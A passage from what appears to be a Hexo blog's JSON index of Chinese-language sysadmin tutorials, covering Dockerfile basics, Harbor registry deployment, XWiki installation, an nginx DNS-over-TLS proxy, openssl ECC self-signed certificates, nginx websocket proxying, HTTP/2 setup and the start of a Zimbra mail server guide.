-p 1080:1080 --name trojan -d trojan:v2 进入容器 1234docker exec -it trojan /bin/bash[root@4f0251ab9801 /]# ps -ef|grep trojanroot 1 0 0 10:57 ? 00:00:00 /etc/trojan/trojan -c /etc/trojan/client.json Dockerfile语法参考： 使用Dockerfile制作镜像","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://garywu520.github.io/tags/Dockerfile/"}]},{"title":"使用Dockerfile制作镜像","slug":"使用Dockerfile制作镜像","date":"2019-12-02T05:50:41.000Z","updated":"2019-12-02T05:52:58.634Z","comments":true,"path":"2019/12/02/使用Dockerfile制作镜像/","link":"","permalink":"https://garywu520.github.io/2019/12/02/%E4%BD%BF%E7%94%A8Dockerfile%E5%88%B6%E4%BD%9C%E9%95%9C%E5%83%8F/","excerpt":"如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，那么之前提及的无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。这个脚本就是 Dockerfile。 Dockerfile 是一个文本文件，其内包含了一条条的 **指令(Instruction)**，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。 以定制centos镜像为例，这次使用Dockerfile来定制","text":"如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，那么之前提及的无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。这个脚本就是 Dockerfile。 Dockerfile 是一个文本文件，其内包含了一条条的 **指令(Instruction)**，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。 以定制centos镜像为例，这次使用Dockerfile来定制 一、创建Dockerfile空白文件123mkdir /opt/docker_centoscd /opt/docker_centostouch Dockerfile 二、根据Dockerfile指令，编辑定制内容要定制Dockerfile文件，首先要明确其各指令的作用 FROM 1FROM centos FROM用来指定一个基础镜像，如:centos或nginx等等，FROM指令必须是第一条指令。 除了基础镜像外，Docker还存在一个特殊的镜像，名为scratch。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。对于 Linux 下静态编译的程序【如Go语言】来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接 FROM scratch 会让镜像体积更加小巧。 RUN RUN 指令是用来执行命令行命令的，其有两种格式： shell格式: RUN &lt;命令&gt; 123RUN cd /rootRUN echo &quot;Dockerfile Test&quot;RUN ls -lh COPY 复制文件 COPY指令用于复制文件； 格式：COPY –chown=: &lt;源路径&gt; &lt;镜像内目标路径&gt; 1COPY ./test /home/test/ CMD 容器启动命令 CMD用来指定容器的启动命令，启动命令需要在前台运行，否则当命令启动后容器就退出了。 格式：CMD &lt;启动命令&gt; 1234#示例：CMD [&quot;/bin/bash&quot;]或CMD [&quot;sh&quot;,&quot;run.sh&quot;] ENTRYPOINT ENTRYPOINT的格式和RUN指令格式和作用一样，都是在指定容器启动程序和参数 建议习惯性使用这个指令，而不是CMD，具体区别：参考 ENV 设置环境变量 格式：ENV 123456#示例ENV NODE_VERSION 7.2.0RUN curl -SLO &quot;https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz&quot; \\ &amp;&amp; curl -SLO &quot;https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc&quot; \\ &amp;&amp; gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc 当设置了环境变量之后，其他指令均可以直接在命令中调用此变量 EXPOSE 暴露端口 格式为: EXPOSE &lt;端口1&gt; [&lt;端口2&gt;…] EXPOSE 指令是声明运行时容器提供服务端口，这仅仅是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。 WORKDIR 指定工作目录 格式: WORKDIR &lt;工作目录路径&gt; 使用 WORKDIR 指令可以来指定工作目录（或者称为当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，WORKDIR 会帮你建立目录。 USER指定当前用户 格式：USER &lt;用户名&gt;[:&lt;用户组&gt;] USER 只是帮助你切换到指定用户而已，这个用户必须是事先建立好的，否则无法切换。 1234#示例：RUN groupadd -r redis &amp;&amp; useradd -r -g redis redisUSER redisRUN [ &quot;redis-server&quot; ] 三、构建镜像Dockerfile文件根据各自需求定制完成后，现在就可以进行构建这个镜像了。使用 docker build 命令进行镜像的构建，格式如下： 12#构建镜像格式docker build [选项] &lt;上下文路径/URL/-&gt; 1234#例如：docker build -t centos:v3 .#注意，命令最后有个“.”,表示上下文路径，并非当前目录;这里使用-t来指定最终构建后的镜像名称 什么是上下文路径？ 构建后，镜像就可以直接使用了 参考：Docker —— 从入门到实践","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Docker","slug":"Docker","permalink":"https://garywu520.github.io/tags/Docker/"},{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://garywu520.github.io/tags/Dockerfile/"}]},{"title":"部署企业级Harbor私有docker镜像仓库","slug":"部署企业级Harbor私有docker镜像仓库","date":"2019-11-28T08:22:35.000Z","updated":"2019-11-28T08:25:05.953Z","comments":true,"path":"2019/11/28/部署企业级Harbor私有docker镜像仓库/","link":"","permalink":"https://garywu520.github.io/2019/11/28/%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7Harbor%E7%A7%81%E6%9C%89docker%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93/","excerpt":"Docker本地镜像可以满足单机使用docker镜像的需求，而在生产环境上，需要将镜像发布到几时/上百台节点上，这时候本地镜像显得心有余而力不足。就需要部署一套开源私有仓库来统一管理镜像！ Habor是由VMWare公司开源的容器镜像仓库，它基于Docker-compose部署 官方地址： https://vmware.github.io/ Github: https://github.com/goharbor/harbor","text":"Docker本地镜像可以满足单机使用docker镜像的需求，而在生产环境上，需要将镜像发布到几时/上百台节点上，这时候本地镜像显得心有余而力不足。就需要部署一套开源私有仓库来统一管理镜像！ Habor是由VMWare公司开源的容器镜像仓库，它基于Docker-compose部署 官方地址： https://vmware.github.io/ Github: https://github.com/goharbor/harbor 一、 Harbor主要功能 基于角色访问控制 镜像复制 LDAP 镜像删除与空间回收 图形界面管理-原生中文支持 审计 REST API 二、Harbor组件 组件 功能 harbor-adminserver 配置管理中心 harbor-db MySQL数据库 harbor-jobservice 负责镜像复制 harbor-log 记录操作日志 harbor-ui Web管理页面和API nginx 前端代理,负责页面和镜像上传/下载/转发 redis 会话 registry 镜像存储 Harbor 3种安装方式： 在线安装： 从Docker Hub下载Harbor相关镜像，因此安装软件包非常小 离线安装： 安装包包含部署的相关镜像，因此安装包比较大 OVA安装程序： 当用户具有VMware vCenter环境时，使用此安装程序，在部署OVA后启动Harbor 三、Harbor离线部署 harbor-offline-installer-v1.9.3.tgz 下载地址：https://github.com/vmware/harbor/releases 12tar -zxvf harbor-offline-installer-v1.9.3.tgzcd harbor HTTPS方式部署 1234567891011hostname: reg.mydomain.com #域名或IP，这里是0.0.0.0http: port: 80https: port: 443 certificate: /etc/ssl/harbor/server.crt private_key: /etc/ssl/harbor/server.keyharbor_admin_password: Harbor12345 ......database: password: root123 准备自签SSL证书 12mkdir -p /etc/ssl/harborcd /etc/ssl/harbor cat ssl.sh 1234567891011121314151617181920if [ $# != 1 ];then echo &quot;USAGE: sh $0 IP&quot; exit 1;fiCNIP=$1echo &quot;3秒后,开始生成根证书....&quot;sleep 3openssl genrsa -out cakey.pem 4096openssl req -new -x509 -key cakey.pem -out cacert.pem -subj &quot;/C=HK/ST=Hongkong/L=Hongkong/O=NASA/OU=Dev/CN=$CNIP/emailAddress=hk_dev@nasa.com&quot;echo &quot;3秒后,开始生成csr以及证书签署...&quot;sleep 3openssl genrsa -out server.key 4096openssl req -new -key server.key -out server.csr -subj &quot;/C=HK/ST=Hongkong/L=Hongkong/O=NASA/OU=Dev/CN=$CNIP/emailAddress=hk_dev@nasa.com&quot;openssl x509 -req -in server.csr -CA cacert.pem -CAkey cakey.pem -CAcreateserial -out server.crt -days 3650echo &quot;自签证书已完成,详情如下:...&quot;ls -lh server* 生成Harbor的配置文件 12cd /root/harbor./prepare 12345#依赖于docker-composecurl -L &quot;https://github.com/docker/compose/releases/download/1.25.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-composeln -s /usr/local/bin/docker-compose /usr/bin/docker-composedocker-compose --version 12345cd /root/harbor./install.sh#查看运行状态docker-compose ps 四、Web访问 https://IP 1账号：admin 密码：Harbor12345 具体使用-请参考: Linux公社","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"镜像仓库","slug":"镜像仓库","permalink":"https://garywu520.github.io/tags/%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93/"},{"name":"harbor","slug":"harbor","permalink":"https://garywu520.github.io/tags/harbor/"}]},{"title":"开源wiki系统-XWiki","slug":"开源wiki系统-XWiki","date":"2019-11-20T07:38:58.000Z","updated":"2019-11-20T10:42:13.649Z","comments":true,"path":"2019/11/20/开源wiki系统-XWiki/","link":"","permalink":"https://garywu520.github.io/2019/11/20/%E5%BC%80%E6%BA%90wiki%E7%B3%BB%E7%BB%9F-XWiki/","excerpt":"一、XWiki介绍就是一个开源wiki，不像 Confluence 一样需要购买 License 才能使用 二、Xwiki官网与下载 官网： https://www.xwiki.org/ XWiki下载页：xwiki download – 检索关键字[xwiki-enterprise-installer-generic] XWwiki安装的版本：xwiki-enterprise-installer-generic-9.4","text":"一、XWiki介绍就是一个开源wiki，不像 Confluence 一样需要购买 License 才能使用 二、Xwiki官网与下载 官网： https://www.xwiki.org/ XWiki下载页：xwiki download – 检索关键字[xwiki-enterprise-installer-generic] XWwiki安装的版本：xwiki-enterprise-installer-generic-9.4 三、 安装JDK download jdk 8u202 123#下载jdk-8u202-linux-x64.rpmrpm -ivh jdk-8u202-linux-x64.rpmjava -version cat /root/.bash_profile 12345#JAVA_Home configexport JAVA_HOME=/usr/java/jdk1.8.0_102/export JRE_HOME=/usr/java/jdk1.8.0_102/jrePATH=$PATH:$HOME/bin:$JAVA_HOME/binexport PATH 1234source .bash_profile echo $JAVA_HOMEecho $JRE_HOMEecho $PATH 四、安装XWiki1234#下载xwiki-enterprise-installer-generic-9.4-standard.jarjava -jar xwiki-enterprise-installer-generic-9.4-standard.jar注：此过程会提示几个问题，根据提示输入&quot;1&quot;或&quot;Y&quot;即可。默认安装目录: /usr/local/XWiki Enterprise 9.4 启动XWiki 12345mv /usr/local/XWiki\\ Enterprise\\ 9.4/ /usr/local/XWiki_Enterprise_9.4cd /usr/local/XWiki_Enterprise_9.4#XWiki 默认运行在 8080 端口，使用-p选项指定运行端口bash start_xwiki.sh -p 8888 Web访问: http://xx.xx.xx.xx:8888 XWiki 默认的管理员用户及密码为：用户名：Admin密码：admin 五、优化1. supervisorctl启动管理cat /etc/supervisord.d/xwiki.conf 12345678910[program:xwiki]directory=/usr/local/XWiki_Enterprise_9.4command=/usr/local/XWiki_Enterprise_9.4/start_xwiki.sh -p 8888username=rootautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 注：由于是JAVA程序启动较慢，supervisor启动后耐心等待即可访问 2.修改中文123456点击Administer Wiki ---&gt;点击Content ---&gt; 点击Localization(1)第一项选择Yes(2)第二项选择 中文(中国)(3)第三项选择 中文(中国)(4)DATE格式： yyyy/MM/dd,HH:mm(5)TIMEZONE: Asia/HongKong 3. 禁止用户注册12345678管理WIKI ---&gt; Users &amp; Rights ---&gt; 权限： -- Groups权限调整[禁止注册] -- Users权限调整[禁止注册]注：Groups和Users均勾选如下选项yes 不论页面、空间权限如何设置，禁止非注册用户察看页面，yes 不论页面、空间权限如何设置，禁止非注册用户编辑页面，yes Require unregistered users to solve a captcha when posting a comment on a page 4.安装Markdown 1.2编辑器1234搜索安装扩展：Markdown, 安装完成后，点击插件右侧的“配置”按钮编辑器改为Markdown: 点击Administer Wiki ---&gt;点击Editing ---&gt; 选择默认文档语法为MarkDown 5. 设置发信1管理WIKI ---&gt; Mail ,根据提示设置发信必要参数即可，当用户账户/密码忘记时，可通过邮箱方式找回 六、插件推荐​ 优质插件：推荐","categories":[],"tags":[{"name":"wiki","slug":"wiki","permalink":"https://garywu520.github.io/tags/wiki/"},{"name":"XWiki","slug":"XWiki","permalink":"https://garywu520.github.io/tags/XWiki/"},{"name":"开源wiki","slug":"开源wiki","permalink":"https://garywu520.github.io/tags/%E5%BC%80%E6%BA%90wiki/"}]},{"title":"部署自己的DoT DNS","slug":"部署自己的DoT-DNS","date":"2019-11-15T02:05:04.000Z","updated":"2019-11-15T02:07:20.180Z","comments":true,"path":"2019/11/15/部署自己的DoT-DNS/","link":"","permalink":"https://garywu520.github.io/2019/11/15/%E9%83%A8%E7%BD%B2%E8%87%AA%E5%B7%B1%E7%9A%84DoT-DNS/","excerpt":"1. 什么是DoT？​ DoT即DNS-over-TLS, 可用于实现终端用户的隐私和安全，DoT它应该运行在853端口。因为大多数DNS客户端使用TCP或UDP协议，这些协议容易被窃听，并且容易受到中间人攻击，比如某国家的被 ISP 滥用。 ​ 在 RFC 7858中规定了 DNS-over-TLS 标准，这是一个非常直接的实现。 本质上，该标准规定使用现有的 DNS-over-TCP 协议支持，大多数 DNS 服务器已经具有这种支持，并向其中添加 TLS。","text":"1. 什么是DoT？​ DoT即DNS-over-TLS, 可用于实现终端用户的隐私和安全，DoT它应该运行在853端口。因为大多数DNS客户端使用TCP或UDP协议，这些协议容易被窃听，并且容易受到中间人攻击，比如某国家的被 ISP 滥用。 ​ 在 RFC 7858中规定了 DNS-over-TLS 标准，这是一个非常直接的实现。 本质上，该标准规定使用现有的 DNS-over-TCP 协议支持，大多数 DNS 服务器已经具有这种支持，并向其中添加 TLS。 2. 环境准备 非朝鲜区域 云服务器1台 自签发SSL证书 [只有企业才有资格为一个公网IP签发证书] — 证书自签类型：ECC椭圆曲线加密 384bits Nginx 3. 实现123yum install -y nginxsystemctl enable nginxsystemctl start nginx 修改nginx.conf include 1234567#与http区段平级include /etc/nginx/conf.d/*.conf;http &#123; ...... ......&#125; cat /etc/nginx/conf.d/dot.conf 1234567891011121314151617181920212223stream &#123; upstream dns-servers &#123; server 8.8.8.8:53; server 8.8.4.4:53; server 1.1.1.1:53; &#125; server &#123; listen 853 ssl; proxy_pass dns-servers; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ssl_protocols TLSv1.2; ssl_prefer_server_ciphers on; ssl_certificate /etc/nginx/ssl/server.crt; ssl_certificate_key /etc/nginx/ssl/server.key; ssl_trusted_certificate /etc/nginx/ssl/fullchain.crt; ssl_dhparam /etc/nginx/ssl/dhparam.pem; ssl_ciphers &quot;ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384&quot;; &#125;&#125; 注：upstream代理的DNS可以是内网DNS主从，也可代理现有墙外DNS 12nginx -tnginx -s reload 验证端口 12$ netstat -lntup|grep 853tcp 0 0 0.0.0.0:853 0.0.0.0:* LISTEN 21751/nginx: master 4. 朝鲜网络–dig测试 配置本地unbound代理 这台Server 853端口 dig测试 123456789101112#本地unbound解析[root@test ~]# dig flickr.com @127.0.0.1; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-9.P2.el7 &lt;&lt;&gt;&gt; flickr.com @127.0.0.1;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; ANSWER SECTION:flickr.com. 60 IN A 13.226.113.74;; Query time: 380 msec;; SERVER: 127.0.0.1#53(127.0.0.1);; WHEN: Thu Nov 14 18:58:01 CST 2019;; MSG SIZE rcvd: 55 123456789101112#非朝鲜网络解析[root@ns ~]# dig flickr.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-9.P2.el7 &lt;&lt;&gt;&gt; flickr.com @1.1.1.1;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; ANSWER SECTION:flickr.com. 29 IN A 13.226.113.74;; Query time: 1 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Thu Nov 14 05:58:32 EST 2019;; MSG SIZE rcvd: 55 可以看出解析结果数据一致，解析结果未被污染 5. 安全建议​ 由于无法得到基于IP的安全证书，所以只能寄托于自签，自签时长建议缩短以天为单位，通过shell脚本自动更新来防止中间人攻击。","categories":[],"tags":[{"name":"DNS","slug":"DNS","permalink":"https://garywu520.github.io/tags/DNS/"},{"name":"TLS","slug":"TLS","permalink":"https://garywu520.github.io/tags/TLS/"},{"name":"SSL","slug":"SSL","permalink":"https://garywu520.github.io/tags/SSL/"},{"name":"DoT","slug":"DoT","permalink":"https://garywu520.github.io/tags/DoT/"},{"name":"DoH","slug":"DoH","permalink":"https://garywu520.github.io/tags/DoH/"}]},{"title":"openssl自签ECC V3证书","slug":"openssl自签ECC-V3证书","date":"2019-11-12T10:29:06.000Z","updated":"2020-04-16T09:28:07.500Z","comments":true,"path":"2019/11/12/openssl自签ECC-V3证书/","link":"","permalink":"https://garywu520.github.io/2019/11/12/openssl%E8%87%AA%E7%AD%BEECC-V3%E8%AF%81%E4%B9%A6/","excerpt":"前提：为支持更强的加密，建议升级openssl到最新版 1. 生成CA根证书首先要准备一个配置文件和一个目录，稍后需要用第3版的证书[支持DNS域名和IP，浏览器可以校验证书里面的DNS是不是和网站实际的域名一样] 1234#serial 文件是openssl管理颁发序号的,index.txt是对newcerts下面新签发的证书的一个简单索引mkdir ssl &amp;&amp; cd ssltouch index.txtecho 01 &gt; serial","text":"前提：为支持更强的加密，建议升级openssl到最新版 1. 生成CA根证书首先要准备一个配置文件和一个目录，稍后需要用第3版的证书[支持DNS域名和IP，浏览器可以校验证书里面的DNS是不是和网站实际的域名一样] 1234#serial 文件是openssl管理颁发序号的,index.txt是对newcerts下面新签发的证书的一个简单索引mkdir ssl &amp;&amp; cd ssltouch index.txtecho 01 &gt; serial cat openssl1.cnf 1234567891011121314151617181920212223242526#注：创建根证书的时候使用的参数是“basicConstraints = CA:true”#basicConstraints = CA:true” 表示创建的是“根证书”[req]req_extensions = v3_reqdistinguished_name = req_distinguished_name[req_distinguished_name]countryName = HKstateOrProvinceName = TLWlocalityName = TLW[ v3_req ]basicConstraints = CA:FALSEkeyUsage = nonRepudiation, digitalSignature, keyEnciphermentsubjectAltName = @alt_names[alt_names]#DNS.1 = server1.example.com#DNS.2 = mail.example.com#DNS.3 = www.example.comIP.1 = xx.xx.xx.xx#IP.2 = xx.xx.xx.xx[ v3_ca ]basicConstraints = CA:true 12345678910#创建根CA的私钥，加密强度为prime256v1openssl ecparam -genkey -name prime256v1 -out ca.key注：prime256v1为加密强度，可通过命令查看：openssl ecparam -list_curves#创建SHA-512自签名的根CA证书（CA certificate）openssl req -passout pass:&quot;password&quot; -new -sha512 -x509 -days 3650 -config openssl1.cnf -extensions v3_ca -key ca.key -out ca.crt -subj &quot;//C=CN\\ST=HongKong\\L=HongKong\\O=My Company\\OU=My Department\\CN=Heath\\emailAddress=hkjs@hk.com&quot;#验证CA certificate是否符合要求openssl x509 -text -noout -in ca.crt 2. 生成域名证书的签名请求创建域名证书所需的cnf文件 cat openssl2.cnf 12345678910111213141516171819202122232425#修改basicConstraints = CA:false” 表示创建的是“非根证书”，即普通证书[req]req_extensions = v3_reqdistinguished_name = req_distinguished_name[req_distinguished_name]countryName = HKstateOrProvinceName = TLWlocalityName = TLW[v3_req]basicConstraints = CA:FALSEkeyUsage = nonRepudiation, digitalSignature, keyEnciphermentsubjectAltName = @alt_names[alt_names]#DNS.1 = server1.example.com#DNS.2 = mail.example.com#DNS.3 = www.example.comIP.1 = xx.xx.xx.xx#IP.2 = xx.xx.xx.xx[v3_ca]basicConstraints = CA:FALSE 123456789#生成域名使用的server.key文件openssl ecparam -genkey -name prime256v1 -out server.key#生成server.csr文件openssl req -passout pass:&quot;password&quot; -new -sha512 -key server.key -out server.csr -extensions v3_req -config openssl2.cnf -subj &quot;//C=CN\\ST=HongKong\\L=HongKong\\O=My Company\\OU=My Department\\CN=Heath\\emailAddress=hkjs@hk.com&quot;#验证DNS信息是否存在了X509v3 Subject Alternative Name里面#确保签名类型为“非根CA”类型，X509v3 Basic Constraints: CA:FALSEopenssl req -text -noout -in server.csr 3. 使用CA签名12#签名之前需要进行如下操作cp /usr/local/ssl/openssl.cnf /root/ssl/ vim openssl.cnf 123#修改CA目录[ CA_default ]dir = /root/ssl 12345678#修改CA策略[ policy_match ]countryName = optionalstateOrProvinceName = optionalorganizationName = optionalorganizationalUnitName = optionalcommonName = optionalemailAddress = optional 1234#用根ca.crt 来给server.csr签名，生成server.crt文件openssl ca -days 3650 -cert ca.crt -keyfile ca.key -md sha512 -extensions v3_req -config openssl.cnf -in server.csr -out server.crt#注：如果提示部分目录或文件不存在，根据提示创建即可 123#验证证书有效性$ openssl verify -verbose -CAfile ca.crt server.crtserver.crt: OK 4. 生成fullchain证书12#将泛域名证书server.crt和根域名证书ca.crt合并为fullchain证书cat server.crt ca.crt &gt;fullchain.crt","categories":[],"tags":[{"name":"https","slug":"https","permalink":"https://garywu520.github.io/tags/https/"},{"name":"openssl","slug":"openssl","permalink":"https://garywu520.github.io/tags/openssl/"},{"name":"ssl","slug":"ssl","permalink":"https://garywu520.github.io/tags/ssl/"},{"name":"eccdsa","slug":"eccdsa","permalink":"https://garywu520.github.io/tags/eccdsa/"},{"name":"ECC","slug":"ECC","permalink":"https://garywu520.github.io/tags/ECC/"}]},{"title":"nginx代理websocket配置","slug":"nginx代理websocket配置","date":"2019-11-12T08:39:25.000Z","updated":"2019-11-12T08:41:44.517Z","comments":true,"path":"2019/11/12/nginx代理websocket配置/","link":"","permalink":"https://garywu520.github.io/2019/11/12/nginx%E4%BB%A3%E7%90%86websocket%E9%85%8D%E7%BD%AE/","excerpt":"1. nginx配置1234567891011 #注：7010为研发上线的websockt服务端口 location /wsfuture/ &#123; proxy_pass http://127.0.0.1:7010; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; &#125;#注：这里的wsfuture指的是研发提供的websocket服务程序的顶级目录，因为如果在此基础上添加二级目录访问出现404","text":"1. nginx配置1234567891011 #注：7010为研发上线的websockt服务端口 location /wsfuture/ &#123; proxy_pass http://127.0.0.1:7010; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; &#125;#注：这里的wsfuture指的是研发提供的websocket服务程序的顶级目录，因为如果在此基础上添加二级目录访问出现404 2. 本地测试 安装nodejs和npm[略] 12node -vnpm -v 初始化npm 123456#初始化npm来生成package.json文件npm init --yes#安装ws模块npm install ws --savenpm install websocket --save 本地连接测试 1234#出现如下提示，说明连接正常$wscat --connect ws://127.0.0.1/wsfuture/IdglKTUUecw=Connected (press CTRL+C to quit)&lt; 如果出现错误：error: Unexpected server response: 404 说明nginx代理路径设置不正确。 其他 如果以上项目测试失败，需要linux模拟websocket服务端和客户端，来验证nginx代理websocket的功能的话，参考如下 参考：云栖社区","categories":[],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"websocket","slug":"websocket","permalink":"https://garywu520.github.io/tags/websocket/"},{"name":"ws","slug":"ws","permalink":"https://garywu520.github.io/tags/ws/"},{"name":"wss","slug":"wss","permalink":"https://garywu520.github.io/tags/wss/"},{"name":"nodejs","slug":"nodejs","permalink":"https://garywu520.github.io/tags/nodejs/"},{"name":"wscat","slug":"wscat","permalink":"https://garywu520.github.io/tags/wscat/"}]},{"title":"为https站点启用http2特性","slug":"为https站点启用http2特性","date":"2019-11-08T12:59:58.000Z","updated":"2019-11-08T13:10:08.567Z","comments":true,"path":"2019/11/08/为https站点启用http2特性/","link":"","permalink":"https://garywu520.github.io/2019/11/08/%E4%B8%BAhttps%E7%AB%99%E7%82%B9%E5%90%AF%E7%94%A8http2%E7%89%B9%E6%80%A7/","excerpt":"1. HTTP/2简介 HTTP/2（超文本传输协议第2版，最初命名为 HTTP 2.0），是HTTP协议的的第二个主要版本，使用于万维网。HTTP/2 是 HTTP 协议自 1999 年 HTTP 1.1 发布后的首个更新，主要基于 SPDY 协议。它由互联网工程任务组 (IETF) 的 Hypertext Transfer Protocol Bis (httpbis) 工作小组进行开发。该组织于2014年12月将 HTTP/2 标准提议递交至IESG进行讨论，于2015年2月17日被批准。HTTP/2 标准于2015年5月以 RFC 7540 正式发表。","text":"1. HTTP/2简介 HTTP/2（超文本传输协议第2版，最初命名为 HTTP 2.0），是HTTP协议的的第二个主要版本，使用于万维网。HTTP/2 是 HTTP 协议自 1999 年 HTTP 1.1 发布后的首个更新，主要基于 SPDY 协议。它由互联网工程任务组 (IETF) 的 Hypertext Transfer Protocol Bis (httpbis) 工作小组进行开发。该组织于2014年12月将 HTTP/2 标准提议递交至IESG进行讨论，于2015年2月17日被批准。HTTP/2 标准于2015年5月以 RFC 7540 正式发表。 2. HTTP/2特点 采用二进制格式传输数据，而非文本格式。二进制格式在协议的解析和优化扩展上带来更多的优势和可能。 对消息头进行压缩传输，能够节省消息头占用的网络的流量，而 HTTP 1.1 每次请求，都会携带大量冗余头信息，浪费了很多带宽资源，头压缩能够很好的解决该问题。 多路复用，就是多个请求都是通过一个 TCP 连接并发完成， HTTP 1.1 虽然通过 pipeline 也能并发请求，但是多个请求之间的响应会被阻塞的，所以 pipeline 至今也没有被普及应用，而 HTTP/2 做到了真正的并发请求，同时流还支持优先级和流量控制。 服务器推送，服务端能够更快的把资源推送给客户端，例如服务端可以主动把 JS 和 CSS 文件推送给客户端，而不需要客户端解析 HTML 再发送这些请求，当客户端需要的时候，它已经在客户端了。 3. HTTP/2站点的优势 提升网站访问速度。 降低服务器压力。 部分替代异步加载的使用。 保护网站安全。 4. 硬核要求 Nginx ＞1.9.5【nginx编译的时候需要指定新版本的openssl, –with-openssl=源码包解压目录】 OpenSSL＞1.0.2 因为 HTTP/2 不仅需要Web服务器还需要一个扩展支持，目前可以用的有 ALPN 和 NPN 两种(Chrome 已经移除了对 NPN 的支持)。只有 OpenSSL 1.0.2 以上版本才开始支持 ALPN 。 仅支持HTTPS 5. 在Nginx上启用HTTP/2 配置 Nginx 开启 HTTP/2 特别简单，在 server 配置段中的 listen 后增加 http2 即可 1234567$ vim /usr/local/nginx/conf/nginx.confserver &#123; listen 443 ssl http2; server_name www.hi-linux.com; ...&#125; 重启 Nginx 后，让配置生效。 1nginx -s reload 6. 命令验证HTTP/2升级curl 12345#下载releaserpm -Uvh http://www.city-fan.org/ftp/contrib/yum-repo/rhel6/x86_64/city-fan.org-release-2-1.rhel6.noarch.rpm#查看最新版本yum --showduplicates list curl --disablerepo=&quot;*&quot; --enablerepo=&quot;city*&quot; vi /etc/yum.repos.d/city-fan.org.repo 1#将[city-fan.org]组的enable值改为1,保存 1234$ yum install curl$ curl -Vcurl 7.67.0 验证网站是否支持HTTP/2 12$ curl --http2 -I https://xxx.netHTTP/2 200 web检测是否支持HTTP/2: KeyCDN: http2-test MySSL: http2_check 7. 浏览器支持目前支持 HTTP/2 浏览器列表 Google Chrome、Mozilla Firefox、Microsoft Edge和Opera已支持HTTP/2，并默认启用。 Internet Explorer自IE 11开始支持HTTP/2，并预设激活 ​ 更详细的浏览器列表可参考：http://caniuse.com/#feat=http2 部分文章参考：运维之美","categories":[],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://garywu520.github.io/tags/HTTPS/"},{"name":"HTTP","slug":"HTTP","permalink":"https://garywu520.github.io/tags/HTTP/"},{"name":"http1.1","slug":"http1-1","permalink":"https://garywu520.github.io/tags/http1-1/"},{"name":"http2","slug":"http2","permalink":"https://garywu520.github.io/tags/http2/"}]},{"title":"zimbra邮件服务器","slug":"zimbra邮件服务器","date":"2019-10-30T09:28:06.000Z","updated":"2019-10-30T09:29:50.344Z","comments":true,"path":"2019/10/30/zimbra邮件服务器/","link":"","permalink":"https://garywu520.github.io/2019/10/30/zimbra%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"zimbra是企业级的电子邮件、日历和办公协作的解决方案。Zimbra Collaboration Suite【简称ZCS】包括Zimbra MTA、 Zimbra LDAP Server和Zimbra Mail Server. 本次演示的是其开源版本 一、先决条件 干净的CentOS7 没有运行HTTP，MAIL，DNS，MySQL及LDAP服务 提前准备域名并将A记录和MX DNS记录解析到本Zimbra服务器 配置FQDN 1echo &quot;39.xx.xx.26 zimbra.domain.com&quot; &gt;&gt; /etc/hosts 12$ hostnamezimbra.domain.com","text":"zimbra是企业级的电子邮件、日历和办公协作的解决方案。Zimbra Collaboration Suite【简称ZCS】包括Zimbra MTA、 Zimbra LDAP Server和Zimbra Mail Server. 本次演示的是其开源版本 一、先决条件 干净的CentOS7 没有运行HTTP，MAIL，DNS，MySQL及LDAP服务 提前准备域名并将A记录和MX DNS记录解析到本Zimbra服务器 配置FQDN 1echo &quot;39.xx.xx.26 zimbra.domain.com&quot; &gt;&gt; /etc/hosts 12$ hostnamezimbra.domain.com 二、安装依赖1yum -y install perl-core unzip libaio nmap-ncat sysstat openssh-clients wget 三、下载Zimbra Collaboaration Suite 